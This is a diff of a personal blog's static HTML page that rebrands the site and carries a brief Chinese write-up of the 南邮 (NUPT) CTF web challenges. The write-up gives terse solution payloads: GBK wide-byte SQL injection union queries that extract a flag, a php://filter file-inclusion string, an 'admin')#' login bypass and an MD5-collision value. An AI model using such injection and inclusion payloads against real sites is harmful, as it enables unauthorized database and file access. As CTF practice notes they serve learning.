@@ -12,7 +12,7 @@
         
             南邮ctf web | 
         
-        凡尘
+        Geroge Lee&#39;s blog
     </title>
 
     <!-- Favicons -->
@@ -27,7 +27,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="George Lee">
     <meta name="description" content="Nothing is difficult to the man who will try.">
-    <meta name="keywords" content="null">
+    <meta name="keywords" content="personal blog">
 
     <!--iOS -->
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
@@ -43,12 +43,12 @@
     <!-- Add to homescreen for Safari on iOS -->
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <meta name="apple-mobile-web-app-title" content="凡尘">
+    <meta name="apple-mobile-web-app-title" content="Geroge Lee&#39;s blog">
 
     <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://yoursite.com">
+    <meta property="og:url" content="http://lzx.dropsec.xyz">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="南邮ctf web | 凡尘">
+    <meta property="og:title" content="南邮ctf web | Geroge Lee&#39;s blog">
     <meta property="og:description" content="Nothing is difficult to the man who will try.">
     
 
@@ -340,7 +340,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=南邮ctf web&url=http://yoursite.com//2017/03/29/南邮ctf-web/index.html&pic=&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=南邮ctf web&url=http://lzx.dropsec.xyz//2017/03/29/南邮ctf-web/index.html&pic=&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -358,7 +358,7 @@
 
     <!-- Share LinkedIn -->
     
-        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=http://yoursite.com//2017/03/29/南邮ctf-web/index.html&title=南邮ctf web" target="_blank">
+        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=http://lzx.dropsec.xyz//2017/03/29/南邮ctf-web/index.html&title=南邮ctf web" target="_blank">
             <li class="mdl-menu__item">
                 分享到 LinkedIn
             </li>
@@ -367,7 +367,7 @@
 
     <!-- Share QQ -->
     
-        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=凡尘&title=南邮ctf web&summary=Nothing is difficult to the man who will try.&pics=http://yoursite.com/img/favicon.png&url=http://yoursite.com/2017/03/29/南邮ctf-web/index.html" target="_blank">
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=Geroge Lee&#39;s blog&title=南邮ctf web&summary=Nothing is difficult to the man who will try.&pics=http://lzx.dropsec.xyz/img/favicon.png&url=http://lzx.dropsec.xyz/2017/03/29/南邮ctf-web/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 QQ
             </li>
@@ -389,7 +389,7 @@
 <p>查看源码就可得到</p>
 <p><strong>md5 collision</strong></p>
 <p>Poc:a=240610708</p>
-<p>&lt;!--more--&gt;</p>
+<a id="more"></a>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20160901180637.png" alt=""></p>
 <p><strong>签到2</strong></p>
 <p>关键点：输入框设定了最大的长度限制</p>
@@ -400,7 +400,7 @@
 <p><strong>单身二十年</strong></p>
 <p>源码点击./search_key.php，getflag</p>
 <p><strong>你从哪里来</strong></p>
-<p>referer: http://www.google.com</p>
+<p>referer: <a href="http://www.google.com" target="_blank" rel="external">http://www.google.com</a></p>
 <p><strong>文件包含</strong></p>
 <p>Poc：file=php://filter/convert.base64-encode/resource=index.php</p>
 <p><strong>单身一百年也没用</strong></p>
@@ -414,14 +414,14 @@
 <p>2、sql.php?id=1024.00001</p>
 <p><strong>sql injection 3</strong></p>
 <p>id=2,gbk</p>
-<p>id=1%df' union select 1,2 --+</p>
-<p>id=1%df' union select database(),2 --+</p>
+<p>id=1%df’ union select 1,2 –+</p>
+<p>id=1%df’ union select database(),2 –+         </p>
 <p>回显sqli</p>
-<p>id=1%df' union select 1,table_name from information_schema.tables where table_schema=0x73716C6931</p>
+<p>id=1%df’ union select 1,table_name from information_schema.tables where table_schema=0x73716C6931</p>
 <p>回显 falg</p>
-<p>id=1%df' union select 1,cloumn_name from information_schema.columns where table_schema=0x73716C6931</p>
+<p>id=1%df’ union select 1,cloumn_name from information_schema.columns where table_schema=0x73716C6931</p>
 <p>回显 fl4g</p>
-<p>id=1%df' union select 1,fl4g from  flag --+</p>
+<p>id=1%df’ union select 1,fl4g from  flag –+</p>
 <p><strong>/x00</strong></p>
 <p>Poc:nctf[]=1.#biubiubiu</p>
 <p><strong>bypass again</strong></p>
@@ -435,7 +435,7 @@
 <p><strong>上传绕过</strong></p>
 <p>截断 <a href="http://www.myhack58.com/Article/html/3/8/2013/36507.htm" target="_blank" rel="external">截断上传绕过</a></p>
 <p><strong>SQL注入1</strong></p>
-<p>admin')#&amp;111</p>
+<p>admin’)#&amp;111</p>
 <p><strong>pass check</strong></p>
 <p>输入123，抓包改为传入数组</p>
 <p><strong>起名字真难</strong></p>
@@ -533,7 +533,7 @@
         <ul id="settings-dropdown" class="dropdown-menu">
             
                 <li>
-                    <a href="#" target="_blank" title="Email Me">
+                    <a href="mailto:970271292@qq.com" target="_blank" title="Email Me">
                         
                             <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
                         
@@ -705,7 +705,7 @@ It will not impact the appearance and can give developers a lot of support :)
                 var fd = new Date();
                 document.write(fd.getFullYear());
             </script>
-            &nbsp;凡尘
+            &nbsp;Geroge Lee's blog
         </div>
 
         <!-- Paradox Footer Right Section -->
